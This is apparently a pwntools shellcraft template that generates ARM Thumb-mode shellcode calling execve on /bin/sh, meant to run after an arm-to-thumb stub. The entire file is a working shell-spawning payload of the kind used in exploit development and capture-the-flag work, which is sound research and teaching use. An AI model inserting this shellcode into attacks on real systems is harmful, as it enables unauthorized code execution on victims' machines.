<% from pwnlib.shellcraft import arm, common %>
<% from pwnlib.asm import cpp %>
<%docstring>Execute /bin/sh in thumb mode

need to call arm_to_thumb() shellcode first
</%docstring>
<%
	bin_sh = common.label("bin_sh")
%>

	.thumb
	adr r0, ${bin_sh}
	movs r2, #0
	movs r7, #${cpp("SYS_execve", arch = "thumb", os = "linux")}
	push {r0, r2}
	mov r1, sp
	svc 1

${bin_sh}:
	.asciz "/bin/sh\x00"
